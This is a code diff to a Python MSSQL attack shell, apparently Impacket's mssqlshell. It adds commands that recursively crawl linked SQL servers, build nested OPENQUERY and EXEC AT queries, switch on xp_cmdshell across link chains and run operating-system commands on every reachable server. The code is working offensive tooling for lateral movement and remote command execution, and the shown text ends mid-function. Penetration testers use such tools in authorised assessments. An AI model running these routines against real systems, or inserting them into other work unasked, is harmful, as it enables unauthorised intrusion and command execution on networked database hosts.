@@ -27,6 +27,7 @@ import sys
 import hashlib
 import base64
 import shlex
+import json
 
 class SQLSHELL(cmd.Cmd):
     def __init__(self, SQL, show_queries=False, tcpShell=None):
@@ -44,6 +45,9 @@ class SQLSHELL(cmd.Cmd):
         self.sql = SQL
         self.show_queries = show_queries
         self.at = []
+        self.crawled_servers = set()  # Track crawled servers to avoid loops
+        self.discovered_paths = []  # Store all discovered link paths for automatic execution
+        self.server_to_paths = {}  # Map server instance names to their paths
         self.set_prompt()
         self.intro = '[!] Press help for extra shell commands'
 
@@ -57,6 +61,8 @@ class SQLSHELL(cmd.Cmd):
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
+    enable_xp_cmdshell_link [path|server] - enable xp_cmdshell through link paths or server instance
+    disable_xp_cmdshell_link [path|server] - disable xp_cmdshell through link paths or server instance
     enum_db                    - enum databases
     enum_links                 - enum linked servers
     enum_impersonate           - check logins that can be impersonated
@@ -69,6 +75,9 @@ class SQLSHELL(cmd.Cmd):
     xp_dirtree {path}          - executes xp_dirtree on the path
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+    crawl_links                - recursively crawl all linked servers and display their info
+    query_link [path|server] {query}  - execute query through all discovered paths, specific path, or server instance
+    xp_cmdshell_link [path|server] {cmd} - execute xp_cmdshell through all discovered paths, specific path, or server instance
     ! {cmd}                    - executes a local shell cmd
     upload {from} {to}         - uploads file {from} to the SQLServer host {to}
     download {from} {to}       - downloads file from the SQLServer host {from} to {to}
@@ -249,6 +258,150 @@ class SQLSHELL(cmd.Cmd):
         except:
             pass
 
+    def do_xp_cmdshell_link(self, line):
+        """
+        Execute xp_cmdshell through all discovered link paths (or a specific path/server if provided).
+        Usage: xp_cmdshell_link "whoami"  (tries all discovered paths)
+        Usage: xp_cmdshell_link link1->link2 "whoami"  (tries specific path)
+        Usage: xp_cmdshell_link DB-SQLSRV "whoami"  (tries paths to server instance DB-SQLSRV)
+        """
+        try:
+            args = shlex.split(line, posix=False)
+            if len(args) < 1:
+                print("[-] Usage: xp_cmdshell_link [link_path|server_name] <command>")
+                print("    Example: xp_cmdshell_link \"whoami\"  (tries all paths)")
+                print("    Example: xp_cmdshell_link link1->link2 \"whoami\"  (specific path)")
+                print("    Example: xp_cmdshell_link DB-SQLSRV \"whoami\"  (server instance name)")
+                return
+            
+            # Check if first arg is a path (contains ->) or is the command
+            paths_to_try = []
+            cmd = None
+            
+            if len(args) == 1:
+                # Only command provided, use all discovered paths
+                cmd = args[0]
+                if not self.discovered_paths:
+                    print("[*] No paths discovered yet. Running crawl_links first...")
+                    self.do_crawl_links("")
+                paths_to_try = self.discovered_paths.copy()
+            elif '->' in args[0] or args[0] == 'LOCAL':
+                # First arg is a path
+                link_path_str = args[0]
+                cmd = ' '.join(args[1:])
+                
+                # Parse link path
+                if link_path_str == 'LOCAL' or link_path_str == '':
+                    link_path = []
+                else:
+                    link_path = [link.strip() for link in link_path_str.split('->')]
+                paths_to_try = [link_path]
+            elif args[0] in self.server_to_paths:
+                # First arg is a server instance name
+                server_name = args[0]
+                cmd = ' '.join(args[1:])
+                paths_to_try = self.server_to_paths[server_name].copy()
+                print(f"[*] Found {len(paths_to_try)} path(s) to server '{server_name}'")
+            else:
+                # Check if it might be a server name but we need to crawl first
+                if not self.discovered_paths:
+                    print("[*] No paths discovered yet. Running crawl_links first...")
+                    self.do_crawl_links("")
+                    # Check again after crawling
+                    if args[0] in self.server_to_paths:
+                        server_name = args[0]
+                        cmd = ' '.join(args[1:])
+                        paths_to_try = self.server_to_paths[server_name].copy()
+                        print(f"[*] Found {len(paths_to_try)} path(s) to server '{server_name}'")
+                    else:
+                        # No path indicator, treat all as command and use all paths
+                        cmd = ' '.join(args)
+                        paths_to_try = self.discovered_paths.copy()
+                else:
+                    # No path indicator, treat all as command and use all paths
+                    cmd = ' '.join(args)
+                    paths_to_try = self.discovered_paths.copy()
+            
+            if not cmd:
+                print("[-] No command provided")
+                return
+            
+            # Try xp_cmdshell on each path
+            success_count = 0
+            for link_path in paths_to_try:
+                try:
+                    path_display = '->'.join(link_path) if link_path else 'LOCAL'
+                    print(f"\n[*] Trying path: {path_display}")
+                    
+                    # Build xp_cmdshell query through link path
+                    # Escape single quotes in the command
+                    escaped_cmd = cmd.replace("'", "''")
+                    # Add WITH RESULT SETS for xp_cmdshell (like PowerUpSQL) to properly handle output
+                    query = f"exec master..xp_cmdshell '{escaped_cmd}' WITH RESULT SETS ((output VARCHAR(8000)))"
+                    if link_path:
+                        final_query = self.build_link_query(link_path, query)
+                    else:
+                        final_query = query
+                    
+                    if self.show_queries:
+                        print(f"[%] {final_query}")
+                    
+                    result = self.sql_query(final_query, show=False)
+                    self.print_replies()
+                    if result:
+                        print(f"[+] Success on path: {path_display}")
+                        # Clean up and display xp_cmdshell output nicely
+                        output_lines = []
+                        for row in result:
+                            # Get the output column (could be 'output' or first column)
+                            output_value = None
+                            if 'output' in row:
+                                output_value = row['output']
+                            elif len(row) > 0:
+                                # Get first column value
+                                output_value = list(row.values())[0]
+                            
+                            # Skip NULL values
+                            if output_value is None:
+                                continue
+                            
+                            # Convert to string and clean up
+                            if isinstance(output_value, bytes):
+                                output_value = output_value.decode('utf-8', errors='ignore')
+                            else:
+                                output_value = str(output_value)
+                            
+                            # Remove b' prefix if present (string representation of bytes)
+                            # This handles cases where bytes are displayed as "b'text'"
+                            if output_value.startswith("b'") and output_value.endswith("'"):
+                                output_value = output_value[2:-1]
+                                # Unescape common escape sequences
+                                output_value = output_value.replace("\\n", "\n").replace("\\t", "\t").replace("\\\\", "\\")
+                            elif output_value.startswith("b'") and len(output_value) > 2:
+                                # Handle case where b' is at start but no closing quote
+                                output_value = output_value[2:]
+                            
+                            # Strip whitespace and skip empty lines
+                            output_value = output_value.strip()
+                            if output_value and output_value.lower() != 'null':
+                                output_lines.append(output_value)
+                        
+                        # Display cleaned output
+                        if output_lines:
+                            print()  # Empty line for readability
+                            print("\n".join(output_lines))
+                        else:
+                            print("(No output)")
+                        success_count += 1
+                    else:
+                        print(f"[-] No results on path: {path_display}")
+                except Exception as e:
+                    print(f"[-] Error on path {path_display}: {e}")
+            
+            print(f"\n[+] xp_cmdshell execution complete. Success on {success_count}/{len(paths_to_try)} paths.")
+        except Exception as e:
+            print(f"[-] Error executing xp_cmdshell: {e}")
+
     def do_sp_start_job(self, s):
         try:
             self.sql_query("DECLARE @job NVARCHAR(100);"
@@ -288,6 +441,418 @@ class SQLSHELL(cmd.Cmd):
         except:
             pass
 
+    def do_enable_xp_cmdshell_link(self, line):
+        """
+        Enable xp_cmdshell through all discovered link paths (or a specific path/server if provided).
+        Usage: enable_xp_cmdshell_link  (tries all discovered paths)
+        Usage: enable_xp_cmdshell_link link1->link2  (tries specific path)
+        Usage: enable_xp_cmdshell_link DB-SQLSRV  (tries paths to server instance DB-SQLSRV)
+        """
+        try:
+            args = shlex.split(line, posix=False) if line.strip() else []
+            paths_to_try = []
+            
+            if len(args) == 0:
+                # No path provided, use all discovered paths
+                if not self.discovered_paths:
+                    print("[*] No paths discovered yet. Running crawl_links first...")
+                    self.do_crawl_links("")
+                paths_to_try = self.discovered_paths.copy()
+            elif '->' in args[0] or args[0] == 'LOCAL':
+                # First arg is a path
+                link_path_str = args[0]
+                
+                # Parse link path
+                if link_path_str == 'LOCAL' or link_path_str == '':
+                    link_path = []
+                else:
+                    link_path = [link.strip() for link in link_path_str.split('->')]
+                paths_to_try = [link_path]
+            elif args[0] in self.server_to_paths:
+                # First arg is a server instance name
+                server_name = args[0]
+                paths_to_try = self.server_to_paths[server_name].copy()
+                print(f"[*] Found {len(paths_to_try)} path(s) to server '{server_name}'")
+            else:
+                # Check if it might be a server name but we need to crawl first
+                if not self.discovered_paths:
+                    print("[*] No paths discovered yet. Running crawl_links first...")
+                    self.do_crawl_links("")
+                    # Check again after crawling
+                    if args[0] in self.server_to_paths:
+                        server_name = args[0]
+                        paths_to_try = self.server_to_paths[server_name].copy()
+                        print(f"[*] Found {len(paths_to_try)} path(s) to server '{server_name}'")
+                    else:
+                        print(f"[-] Server '{args[0]}' not found in discovered servers")
+                        return
+                else:
+                    print(f"[-] Server '{args[0]}' not found in discovered servers")
+                    return
+            
+            # Enable xp_cmdshell on each path
+            enable_query = "exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;"
+            success_count = 0
+            for link_path in paths_to_try:
+                try:
+                    path_display = '->'.join(link_path) if link_path else 'LOCAL'
+                    print(f"\n[*] Enabling xp_cmdshell on path: {path_display}")
+                    
+                    # Build query through link path
+                    # Try EXEC AT first (requires RPC), fall back to OPENQUERY if RPC not enabled
+                    if link_path:
+                        # Try EXEC AT first
+                        final_query = self.build_link_exec_at_query(link_path, enable_query)
+                    else:
+                        final_query = enable_query
+                    
+                    if self.show_queries:
+                        print(f"[%] {final_query}")
+                    
+                    result = self.sql_query(final_query, show=False)
+                    self.print_replies()
+                    
+                    # Check for RPC error - check both lastError and replies
+                    rpc_error = False
+                    error_msg_str = ""
+                    
+                    # First check lastError (set by printReplies when there's an error)
+                    if hasattr(self.sql, 'lastError') and self.sql.lastError:
+                        error_msg_str = str(self.sql.lastError)
+                        if 'not configured for RPC' in error_msg_str or ('RPC' in error_msg_str and 'not configured' in error_msg_str):
+                            rpc_error = True
+                    
+                    # Also check replies directly (Structure objects support dictionary access like printReplies does)
+                    if not rpc_error and hasattr(self.sql, 'replies') and self.sql.replies:
+                        for reply_list in self.sql.replies.values():
+                            for reply in reply_list:
+                                # Structure objects support dictionary access (like printReplies uses)
+                                try:
+                                    if reply["TokenType"] == 0xAA:  # TDS_ERROR_TOKEN
+                                        msg_text = reply["MsgText"]
+                                        if isinstance(msg_text, bytes):
+                                            try:
+                                                error_msg = msg_text.decode('utf-16le')
+                                            except:
+                                                error_msg = str(msg_text)
+                                        else:
+                                            error_msg = str(msg_text)
+                                        
+                                        if 'not configured for RPC' in error_msg or ('RPC' in error_msg and 'not configured' in error_msg):
+                                            rpc_error = True
+                                            break
+                                except (KeyError, TypeError):
+                                    # Try attribute access as fallback
+                                    if hasattr(reply, 'TokenType') and reply.TokenType == 0xAA:
+                                        msg_text = getattr(reply, 'MsgText', b'')
+                                        if isinstance(msg_text, bytes):
+                                            try:
+                                                error_msg = msg_text.decode('utf-16le')
+                                            except:
+                                                error_msg = str(msg_text)
+                                        else:
+                                            error_msg = str(msg_text)
+                                        
+                                        if 'not configured for RPC' in error_msg or ('RPC' in error_msg and 'not configured' in error_msg):
+                                            rpc_error = True
+                                            break
+                            if rpc_error:
+                                break
+                    
+                    # If EXEC AT failed due to RPC, try OPENQUERY as fallback
+                    if rpc_error and link_path:
+                        print(f"[*] RPC not enabled, trying OPENQUERY fallback...")
+                        # For OPENQUERY, wrap the commands in a way that might work
+                        # Note: sp_configure returns multiple result sets, so OPENQUERY may still fail
+                        openquery_query = f"select 1;{enable_query}"
+                        final_query = self.build_link_query(link_path, openquery_query)
+                        
+                        if self.show_queries:
+                            print(f"[%] {final_query}")
+                        
+                        result = self.sql_query(final_query, show=False)
+                        self.print_replies()
+                        
+                        # Check if OPENQUERY worked or if it also failed
+                        openquery_failed = False
+                        if hasattr(self.sql, 'replies') and self.sql.replies:
+                            for reply_list in self.sql.replies.values():
+                                for reply in reply_list:
+                                    # Replies are Structure objects, access attributes directly
+                                    if hasattr(reply, 'TokenType') and reply.TokenType == 0xAA:  # TDS_ERROR_TOKEN
+                                        msg_text = getattr(reply, 'MsgText', b'')
+                                        if isinstance(msg_text, bytes):
+                                            try:
+                                                error_msg = msg_text.decode('utf-16le')
+                                            except:
+                                                error_msg = str(msg_text)
+                                        else:
+                                            error_msg = str(msg_text)
+                                        
+                                        if 'metadata could not be determined' in error_msg.lower() or 'sp_configure' in error_msg.lower():
+                                            openquery_failed = True
+                                            break
+                                if openquery_failed:
+                                    break
+                        
+                        if result and not openquery_failed:
+                            print(f"[+] Successfully enabled xp_cmdshell on path: {path_display} (via OPENQUERY)")
+                            success_count += 1
+                        else:
+                            print(f"[-] OPENQUERY also failed - sp_configure requires RPC to be enabled on linked server")
+                    elif result and not rpc_error:
+                        print(f"[+] Successfully enabled xp_cmdshell on path: {path_display}")
+                        success_count += 1
+                    else:
+                        print(f"[-] Failed to enable xp_cmdshell on path: {path_display}")
+                except Exception as e:
+                    error_msg = str(e)
+                    # Check if it's an RPC error and try OPENQUERY fallback
+                    if 'not configured for RPC' in error_msg or ('RPC' in error_msg and 'not configured' in error_msg):
+                        if link_path:
+                            try:
+                                print(f"[*] RPC not enabled, trying OPENQUERY fallback...")
+                                openquery_query = f"select 1;{enable_query}"
+                                final_query = self.build_link_query(link_path, openquery_query)
+                                
+                                if self.show_queries:
+                                    print(f"[%] {final_query}")
+                                
+                                result = self.sql_query(final_query, show=False)
+                                self.print_replies()
+                                
+                                # Check if OPENQUERY also failed
+                                openquery_failed = False
+                                if hasattr(self.sql, 'replies') and self.sql.replies:
+                                    for reply_list in self.sql.replies.values():
+                                        for reply in reply_list:
+                                            # Replies are Structure objects, access attributes directly
+                                            if hasattr(reply, 'TokenType') and reply.TokenType == 0xAA:  # TDS_ERROR_TOKEN
+                                                msg_text = getattr(reply, 'MsgText', b'')
+                                                if isinstance(msg_text, bytes):
+                                                    try:
+                                                        error_msg2 = msg_text.decode('utf-16le')
+                                                    except:
+                                                        error_msg2 = str(msg_text)
+                                                else:
+                                                    error_msg2 = str(msg_text)
+                                                
+                                                if 'metadata could not be determined' in error_msg2.lower() or 'sp_configure' in error_msg2.lower():
+                                                    openquery_failed = True
+                                                    break
+                                        if openquery_failed:
+                                            break
+                                
+                                if result and not openquery_failed:
+                                    print(f"[+] Successfully enabled xp_cmdshell on path: {path_display} (via OPENQUERY)")
+                                    success_count += 1
+                                else:
+                                    print(f"[-] OPENQUERY also failed - sp_configure requires RPC to be enabled on linked server")
+                            except Exception as e2:
+                                print(f"[-] Error on path {path_display}: {e2}")
+                        else:
+                            print(f"[-] Error on path {path_display}: {e}")
+                    else:
+                        print(f"[-] Error on path {path_display}: {e}")
+            
+            print(f"\n[+] xp_cmdshell enable complete. Success on {success_count}/{len(paths_to_try)} paths.")
+        except Exception as e:
+            print(f"[-] Error enabling xp_cmdshell: {e}")
+
+    def do_disable_xp_cmdshell_link(self, line):
+        """
+        Disable xp_cmdshell through all discovered link paths (or a specific path/server if provided).
+        Usage: disable_xp_cmdshell_link  (tries all discovered paths)
+        Usage: disable_xp_cmdshell_link link1->link2  (tries specific path)
+        Usage: disable_xp_cmdshell_link DB-SQLSRV  (tries paths to server instance DB-SQLSRV)
+        """
+        try:
+            args = shlex.split(line, posix=False) if line.strip() else []
+            paths_to_try = []
+            
+            if len(args) == 0:
+                # No path provided, use all discovered paths
+                if not self.discovered_paths:
+                    print("[*] No paths discovered yet. Running crawl_links first...")
+                    self.do_crawl_links("")
+                paths_to_try = self.discovered_paths.copy()
+            elif '->' in args[0] or args[0] == 'LOCAL':
+                # First arg is a path
+                link_path_str = args[0]
+                
+                # Parse link path
+                if link_path_str == 'LOCAL' or link_path_str == '':
+                    link_path = []
+                else:
+                    link_path = [link.strip() for link in link_path_str.split('->')]
+                paths_to_try = [link_path]
+            elif args[0] in self.server_to_paths:
+                # First arg is a server instance name
+                server_name = args[0]
+                paths_to_try = self.server_to_paths[server_name].copy()
+                print(f"[*] Found {len(paths_to_try)} path(s) to server '{server_name}'")
+            else:
+                # Check if it might be a server name but we need to crawl first
+                if not self.discovered_paths:
+                    print("[*] No paths discovered yet. Running crawl_links first...")
+                    self.do_crawl_links("")
+                    # Check again after crawling
+                    if args[0] in self.server_to_paths:
+                        server_name = args[0]
+                        paths_to_try = self.server_to_paths[server_name].copy()
+                        print(f"[*] Found {len(paths_to_try)} path(s) to server '{server_name}'")
+                    else:
+                        print(f"[-] Server '{args[0]}' not found in discovered servers")
+                        return
+                else:
+                    print(f"[-] Server '{args[0]}' not found in discovered servers")
+                    return
+            
+            # Disable xp_cmdshell on each path
+            disable_query = "exec sp_configure 'xp_cmdshell', 0 ;RECONFIGURE;exec sp_configure 'show advanced options', 0 ;RECONFIGURE;"
+            success_count = 0
+            for link_path in paths_to_try:
+                try:
+                    path_display = '->'.join(link_path) if link_path else 'LOCAL'
+                    print(f"\n[*] Disabling xp_cmdshell on path: {path_display}")
+                    
+                    # Build query through link path
+                    # Try EXEC AT first (requires RPC), fall back to OPENQUERY if RPC not enabled
+                    if link_path:
+                        # Try EXEC AT first
+                        final_query = self.build_link_exec_at_query(link_path, disable_query)
+                    else:
+                        final_query = disable_query
+                    
+                    if self.show_queries:
+                        print(f"[%] {final_query}")
+                    
+                    result = self.sql_query(final_query, show=False)
+                    self.print_replies()
+                    
+                    # Check for RPC error - check both lastError and replies
+                    rpc_error = False
+                    error_msg_str = ""
+                    
+                    # First check lastError (set by printReplies when there's an error)
+                    if hasattr(self.sql, 'lastError') and self.sql.lastError:
+                        error_msg_str = str(self.sql.lastError)
+                        if 'not configured for RPC' in error_msg_str or ('RPC' in error_msg_str and 'not configured' in error_msg_str):
+                            rpc_error = True
+                    
+                    # Also check replies directly (Structure objects support dictionary access like printReplies does)
+                    if not rpc_error and hasattr(self.sql, 'replies') and self.sql.replies:
+                        for reply_list in self.sql.replies.values():
+                            for reply in reply_list:
+                                # Structure objects support dictionary access (like printReplies uses)
+                                try:
+                                    if reply["TokenType"] == 0xAA:  # TDS_ERROR_TOKEN
+                                        msg_text = reply["MsgText"]
+                                        if isinstance(msg_text, bytes):
+                                            try:
+                                                error_msg = msg_text.decode('utf-16le')
+                                            except:
+                                                error_msg = str(msg_text)
+                                        else:
+                                            error_msg = str(msg_text)
+                                        
+                                        if 'not configured for RPC' in error_msg or ('RPC' in error_msg and 'not configured' in error_msg):
+                                            rpc_error = True
+                                            break
+                                except (KeyError, TypeError):
+                                    # Try attribute access as fallback
+                                    if hasattr(reply, 'TokenType') and reply.TokenType == 0xAA:
+                                        msg_text = getattr(reply, 'MsgText', b'')
+                                        if isinstance(msg_text, bytes):
+                                            try:
+                                                error_msg = msg_text.decode('utf-16le')
+                                            except:
+                                                error_msg = str(msg_text)
+                                        else:
+                                            error_msg = str(msg_text)
+                                        
+                                        if 'not configured for RPC' in error_msg or ('RPC' in error_msg and 'not configured' in error_msg):
+                                            rpc_error = True
+                                            break
+                            if rpc_error:
+                                break
+                    
+                    # If EXEC AT failed due to RPC, try OPENQUERY as fallback
+                    if rpc_error and link_path:
+                        print(f"[*] RPC not enabled, trying OPENQUERY fallback...")
+                        # For OPENQUERY, wrap the commands
+                        openquery_query = f"select 1;{disable_query}"
+                        final_query = self.build_link_query(link_path, openquery_query)
+                        
+                        if self.show_queries:
+                            print(f"[%] {final_query}")
+                        
+                        result = self.sql_query(final_query, show=False)
+                        self.print_replies()
+                        
+                        # Check if OPENQUERY worked or if it also failed
+                        openquery_failed = False
+                        if hasattr(self.sql, 'replies') and self.sql.replies:
+                            for reply_list in self.sql.replies.values():
+                                for reply in reply_list:
+                                    # Replies are Structure objects, access attributes directly
+                                    if hasattr(reply, 'TokenType') and reply.TokenType == 0xAA:  # TDS_ERROR_TOKEN
+                                        msg_text = getattr(reply, 'MsgText', b'')
+                                        if isinstance(msg_text, bytes):
+                                            try:
+                                                error_msg = msg_text.decode('utf-16le')
+                                            except:
+                                                error_msg = str(msg_text)
+                                        else:
+                                            error_msg = str(msg_text)
+                                        
+                                        if 'metadata could not be determined' in error_msg.lower() or 'sp_configure' in error_msg.lower():
+                                            openquery_failed = True
+                                            break
+                                if openquery_failed:
+                                    break
+                        
+                        if result and not openquery_failed:
+                            print(f"[+] Successfully disabled xp_cmdshell on path: {path_display} (via OPENQUERY)")
+                            success_count += 1
+                        else:
+                            print(f"[-] OPENQUERY also failed - sp_configure requires RPC to be enabled on linked server")
+                    elif result and not rpc_error:
+                        print(f"[+] Successfully disabled xp_cmdshell on path: {path_display}")
+                        success_count += 1
+                    else:
+                        print(f"[-] Failed to disable xp_cmdshell on path: {path_display}")
+                except Exception as e:
+                    error_msg = str(e)
+                    # Check if it's an RPC error and try OPENQUERY fallback
+                    if 'not configured for RPC' in error_msg or 'RPC' in error_msg:
+                        if link_path:
+                            try:
+                                print(f"[*] RPC not enabled, trying OPENQUERY fallback...")
+                                openquery_query = f"select 1;{disable_query}"
+                                final_query = self.build_link_query(link_path, openquery_query)
+                                
+                                if self.show_queries:
+                                    print(f"[%] {final_query}")
+                                
+                                result = self.sql_query(final_query, show=False)
+                                self.print_replies()
+                                if result:
+                                    print(f"[+] Successfully disabled xp_cmdshell on path: {path_display} (via OPENQUERY)")
+                                    success_count += 1
+                                else:
+                                    print(f"[-] Failed to disable xp_cmdshell on path: {path_display}")
+                            except Exception as e2:
+                                print(f"[-] Error on path {path_display}: {e2}")
+                        else:
+                            print(f"[-] Error on path {path_display}: {e}")
+                    else:
+                        print(f"[-] Error on path {path_display}: {e}")
+            
+            print(f"\n[+] xp_cmdshell disable complete. Success on {success_count}/{len(paths_to_try)} paths.")
+        except Exception as e:
+            print(f"[-] Error disabling xp_cmdshell: {e}")
+
     def do_enum_links(self, line):
         self.sql_query("EXEC sp_linkedservers")
         self.print_replies()
@@ -295,6 +860,320 @@ class SQLSHELL(cmd.Cmd):
         self.sql_query("EXEC sp_helplinkedsrvlogin")
         self.print_replies()
         self.sql.printRows()
+
+    def build_link_query(self, link_path, query, depth=0):
+        """
+        Build a nested query through a link path (recursive, like PowerUpSQL).
+        For SELECT queries, uses OPENQUERY (like PowerUpSQL).
+        For EXEC queries, uses EXEC AT.
+        For path ['link1', 'link2'], builds nested queries with proper quote escaping.
+        Quote escaping: at depth N, quotes are escaped 2^N times (matching PowerUpSQL logic).
+        """
+        if len(link_path) <= 0:
+            # Base case: escape quotes in the original query based on depth
+            num_escapes = int(2 ** depth)
+            if num_escapes == 1:
+                escaped_query = query.replace("'", "''")
+            else:
+                # Replace each ' with ' repeated num_escapes times
+                escaped_query = query.replace("'", "'" * num_escapes)
+            return escaped_query
+        
+        # Recursively build query for the rest of the path
+        remaining_path = link_path[1:]
+        current_link = link_path[0]
+        inner_query = self.build_link_query(remaining_path, query, depth + 1)
+        
+        # Add quotes around the inner query (2^depth quotes on each side)
+        # The inner query already has proper escaping from the recursive call
+        num_quotes = int(2 ** depth)
+        quote_str = "'" * num_quotes
+        
+        # Always use OPENQUERY (like PowerUpSQL) - it works for both SELECT and EXEC statements
+        # OPENQUERY doesn't require RPC to be enabled, unlike EXEC AT
+        # Quote link name with double quotes (OPENQUERY requires this)
+        return f'SELECT * FROM OPENQUERY("{current_link}", {quote_str}{inner_query}{quote_str})'
+
+    def build_link_exec_at_query(self, link_path, query, depth=0):
+        """
+        Build a nested EXEC AT query through a link path (for sp_configure and similar commands).
+        These commands return multiple result sets and don't work with OPENQUERY.
+        Uses EXEC AT which requires RPC to be enabled on the linked server.
+        For path ['link1', 'link2'], builds nested EXEC AT queries with proper quote escaping.
+        """
+        if len(link_path) <= 0:
+            # Base case: escape quotes in the original query based on depth
+            num_escapes = int(2 ** depth)
+            if num_escapes == 1:
+                escaped_query = query.replace("'", "''")
+            else:
+                # Replace each ' with ' repeated num_escapes times
+                escaped_query = query.replace("'", "'" * num_escapes)
+            return escaped_query
+        
+        # Recursively build query for the rest of the path
+        remaining_path = link_path[1:]
+        current_link = link_path[0]
+        inner_query = self.build_link_exec_at_query(remaining_path, query, depth + 1)
+        
+        # Add quotes around the inner query (2^depth quotes on each side)
+        num_quotes = int(2 ** depth)
+        quote_str = "'" * num_quotes
+        
+        # Use EXEC AT for configuration commands (requires RPC to be enabled)
+        # Quote link name with square brackets (SQL Server identifier quoting)
+        return f"EXEC ({quote_str}{inner_query}{quote_str}) AT [{current_link}]"
+
+    def get_server_info(self, link_path=None):
+        """
+        Get server information (servername, version, user, sysadmin) through a link path.
+        Returns dict with server info or None on error.
+        """
+        try:
+            # Build query to get server info
+            info_query = "SELECT @@servername as servername, @@version as version, system_user as linkuser, is_srvrolemember('sysadmin') as issysadmin"
+            
+            if link_path:
+                query = self.build_link_query(link_path, info_query)
+            else:
+                query = info_query
+            
+            result = self.sql_query(query, show=False)
+            if result and len(result) > 0:
+                return {
+                    'servername': result[0].get('servername', 'Unknown'),
+                    'version': result[0].get('version', 'Unknown'),
+                    'linkuser': result[0].get('linkuser', 'Unknown'),
+                    'issysadmin': result[0].get('issysadmin', 0)
+                }
+        except Exception as e:
+            print(f"[-] Error getting server info: {e}")
+        return None
+
+    def get_linked_servers(self, link_path=None):
+        """
+        Get list of linked servers through a link path.
+        Returns list of linked server names or empty list on error.
+        """
+        try:
+            links_query = "SELECT srvname FROM master..sysservers WHERE dataaccess=1"
+            
+            if link_path:
+                query = self.build_link_query(link_path, links_query)
+            else:
+                query = links_query
+            
+            result = self.sql_query(query, show=False)
+            if result:
+                return [row.get('srvname', '') for row in result if row.get('srvname')]
+        except Exception as e:
+            print(f"[-] Error getting linked servers: {e}")
+        return []
+
+    def crawl_links_recursive(self, current_path=None, max_depth=10, depth=0):
+        """
+        Recursively crawl linked servers.
+        current_path: list of link names representing the path to current server
+        max_depth: maximum recursion depth to prevent infinite loops
+        depth: current recursion depth
+        """
+        if depth > max_depth:
+            return []
+        
+        if current_path is None:
+            current_path = []
+        
+        # Create path identifier to avoid loops
+        path_key = '->'.join(current_path) if current_path else 'LOCAL'
+        if path_key in self.crawled_servers:
+            return []
+        
+        self.crawled_servers.add(path_key)
+        
+        results = []
+        
+        # Get server info
+        server_info = self.get_server_info(current_path)
+        if not server_info:
+            print(f"[-] Could not get server info for path: {path_key}")
+            return results
+        
+        # Get linked servers
+        linked_servers = self.get_linked_servers(current_path)
+        
+        # Display current server info
+        path_display = path_key if path_key != 'LOCAL' else 'LOCAL'
+        print(f"\n[+] Server: {server_info['servername']}")
+        print(f"    Path: {path_display}")
+        print(f"    Version: {server_info['version'][:50]}...")  # Truncate long version strings
+        print(f"    User: {server_info['linkuser']}")
+        print(f"    IsSysAdmin: {bool(server_info['issysadmin'])}")
+        print(f"    Linked Servers: {', '.join(linked_servers) if linked_servers else 'None'}")
+        
+        # Store result
+        results.append({
+            'path': current_path.copy(),
+            'servername': server_info['servername'],
+            'version': server_info['version'],
+            'linkuser': server_info['linkuser'],
+            'issysadmin': server_info['issysadmin'],
+            'linked_servers': linked_servers
+        })
+        
+        # Recursively crawl each linked server
+        for link in linked_servers:
+            # Avoid loops: don't crawl if this link is already in the path
+            if link not in current_path:
+                new_path = current_path + [link]
+                sub_results = self.crawl_links_recursive(new_path, max_depth, depth + 1)
+                results.extend(sub_results)
+        
+        return results
+
+    def do_crawl_links(self, line):
+        """
+        Recursively crawl all linked servers.
+        Usage: crawl_links [max_depth]
+        """
+        try:
+            max_depth = 10
+            if line.strip():
+                max_depth = int(line.strip())
+            
+            print(f"[*] Starting link crawl (max depth: {max_depth})...")
+            self.crawled_servers = set()  # Reset crawled servers
+            results = self.crawl_links_recursive(max_depth=max_depth)
+            
+            # Store all discovered paths for later use
+            self.discovered_paths = [result['path'] for result in results]
+            # Also include LOCAL (empty path)
+            if [] not in self.discovered_paths:
+                self.discovered_paths.insert(0, [])
+            
+            # Build mapping of server instance names to paths
+            self.server_to_paths = {}
+            for result in results:
+                servername = result['servername']
+                path = result['path']
+                if servername not in self.server_to_paths:
+                    self.server_to_paths[servername] = []
+                self.server_to_paths[servername].append(path)
+            
+            # Also map LOCAL server
+            local_info = self.get_server_info([])
+            if local_info:
+                local_servername = local_info['servername']
+                if local_servername not in self.server_to_paths:
+                    self.server_to_paths[local_servername] = []
+                if [] not in self.server_to_paths[local_servername]:
+                    self.server_to_paths[local_servername].append([])
+            
+            print(f"\n[+] Crawl complete. Found {len(results)} servers.")
+            print(f"[+] Discovered {len(self.discovered_paths)} paths for query execution.")
+        except ValueError:
+            print("[-] Invalid max_depth. Usage: crawl_links [max_depth]")
+        except Exception as e:
+            print(f"[-] Error during crawl: {e}")
+
+    def do_query_link(self, line):
+        """
+        Execute a query through all discovered link paths (or a specific path/server if provided).
+        Usage: query_link "SELECT @@version"  (tries all discovered paths)
+        Usage: query_link link1->link2 "SELECT @@version"  (tries specific path)
+        Usage: query_link DB-SQLSRV "SELECT @@version"  (tries paths to server instance DB-SQLSRV)
+        """
+        try:
+            args = shlex.split(line, posix=False)
+            if len(args) < 1:
+                print("[-] Usage: query_link [link_path|server_name] <query>")
+                print("    Example: query_link \"SELECT @@version\"  (tries all paths)")
+                print("    Example: query_link link1->link2 \"SELECT @@version\"  (specific path)")
+                print("    Example: query_link DB-SQLSRV \"SELECT @@version\"  (server instance name)")
+                return
+            
+            # Check if first arg is a path (contains ->) or is the query
+            paths_to_try = []
+            query = None
+            
+            if len(args) == 1:
+                # Only query provided, use all discovered paths
+                query = args[0]
+                if not self.discovered_paths:
+                    print("[*] No paths discovered yet. Running crawl_links first...")
+                    self.do_crawl_links("")
+                paths_to_try = self.discovered_paths.copy()
+            elif '->' in args[0] or args[0] == 'LOCAL':
+                # First arg is a path
+                link_path_str = args[0]
+                query = ' '.join(args[1:])
+                
+                # Parse link path
+                if link_path_str == 'LOCAL' or link_path_str == '':
+                    link_path = []
+                else:
+                    link_path = [link.strip() for link in link_path_str.split('->')]
+                paths_to_try = [link_path]
+            elif args[0] in self.server_to_paths:
+                # First arg is a server instance name
+                server_name = args[0]
+                query = ' '.join(args[1:])
+                paths_to_try = self.server_to_paths[server_name].copy()
+                print(f"[*] Found {len(paths_to_try)} path(s) to server '{server_name}'")
+            else:
+                # Check if it might be a server name but we need to crawl first
+                if not self.discovered_paths:
